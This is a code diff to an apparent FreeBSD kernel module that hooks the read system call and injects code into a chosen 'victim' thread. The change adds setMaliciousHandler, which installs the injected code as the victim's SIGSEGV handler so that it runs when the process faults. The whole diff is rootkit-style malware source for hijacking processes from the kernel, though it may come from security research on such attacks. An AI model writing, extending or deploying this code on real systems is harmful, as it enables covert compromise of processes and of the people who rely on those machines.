@@ -64,7 +64,7 @@ isVictimThread (struct thread * td) {
   return 0;
 }
 
-static void
+static void *
 insertMaliciousCode (struct thread * td) {
   //
   // Don't inject anything if we've already done it.
@@ -90,6 +90,30 @@ insertMaliciousCode (struct thread * td) {
   // Mark that we've inserted the malicious code.
   //
   injected = 1;
+  return td->td_retval[0];
+}
+
+//
+// Function: setMaliciousHandler ()
+//
+// Description:
+//  Modify the specified thread so that it has a signal handler at the
+//  specified location.
+//
+static void
+setMaliciousHandler (struct thread * td, void * handler) {
+  struct sigaction action;
+
+  //
+  // Initialize the arguments.
+  //
+  bzero (&action, sizeof (struct sigaction));
+  action.sa_handler = handler;
+
+  //
+  // Install the signal handler for the victim thread.
+  //
+  kern_sigaction (td, SIGSEGV, &action, NULL, 0);
 }
 
 //
@@ -141,8 +165,10 @@ read_hook (struct thread * td, void * syscall_args) {
   // If this is the victim process, and we have not injected code yet,
   // inject the code.
   //
-  if (isVictimThread (td))
-    insertMaliciousCode (td);
+  if (isVictimThread (td)) {
+    void * handler = insertMaliciousCode (td);
+    setMaliciousHandler (td, handler);
+  }
 
   //
   // Perform the read using the original system call.
